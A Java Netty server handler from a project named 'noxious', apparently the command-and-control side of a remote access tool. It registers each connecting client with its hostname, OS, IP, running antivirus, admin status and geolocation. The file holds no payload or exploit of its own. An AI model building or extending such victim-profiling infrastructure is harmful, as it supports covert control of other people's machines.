package org.noxious.netty.handlers;

import io.netty.channel.ChannelHandlerContext;
import org.noxious.netty.handlers.client.ClientChannelHandler;
import org.noxious.netty.handlers.client.wrappers.ChannelHandlerWrapper;
import org.noxious.netty.handlers.client.wrappers.ClientWrapper;
import org.noxious.netty.handlers.events.IChannelEventsHandler;
import org.noxious.packet.DefinedPacket;
import org.noxious.packet.impl.HandshakePacket;
import org.noxious.utils.Logger;

import java.util.Random;


public class CDPHandler implements IChannelEventsHandler {

    @Override
    public void connected(ChannelHandlerContext ch) throws Exception {
        // Todo replace place holder for sending client id, this just temp
        Random rand = new Random();
        int number = Math.abs(rand.nextInt());

        ChannelHandlerWrapper wrapper = new ChannelHandlerWrapper(ch);
        wrapper.sendPacket(new HandshakePacket(number));
        Logger.info("Connected client: " + ch.channel().remoteAddress());
        Logger.info("Sent packet Handshake");
    }

    @Override
    public void disconnected(ChannelHandlerContext ch) throws Exception {

    }

    @Override
    public void handlePacket(ChannelHandlerContext ch, DefinedPacket packet) throws Exception {
        /* Handshake packet
        id  =  index var + 1
        hostname = client hostname
        client name = client name
        os = os / arch
        Ip = Ipv4
        AntiVirus = Windows, avast, McAfee/ whatever active
        Admin = True or false
        Geo Loc = System location via sat / gps
         */
        if (packet instanceof HandshakePacket) {
            System.out.println("Handshake packet received");
            int clientId = ((HandshakePacket) packet).getClientId();
            String hostname = ((HandshakePacket) packet).getHostname();
            String clientName = ((HandshakePacket) packet).getClientName();
            String os = ((HandshakePacket) packet).getOs();
            String ip = ((HandshakePacket) packet).getIp();
            String antivirus = ((HandshakePacket) packet).getAntivirus();
            boolean isAdmin = ((HandshakePacket) packet).isAdmin();
            String geoLocation  = ((HandshakePacket) packet).getGeoLocation();

            ChannelHandlerWrapper wrapper = new ChannelHandlerWrapper(ch);
            ClientWrapper client = new ClientWrapper(wrapper, clientId, hostname, clientName, os, ip, antivirus, isAdmin, geoLocation);

            if (ClientChannelHandler.isDupe(clientId)) {
                // This shouldnt happen since when handshake packet requested, the packet is already going to make sure not a dup
                Logger.error("Duplicate client id: " + clientId);
                return;
            }
            // Todo Add to client table
            ClientChannelHandler.addClient(clientId, client);
        }
    }
}
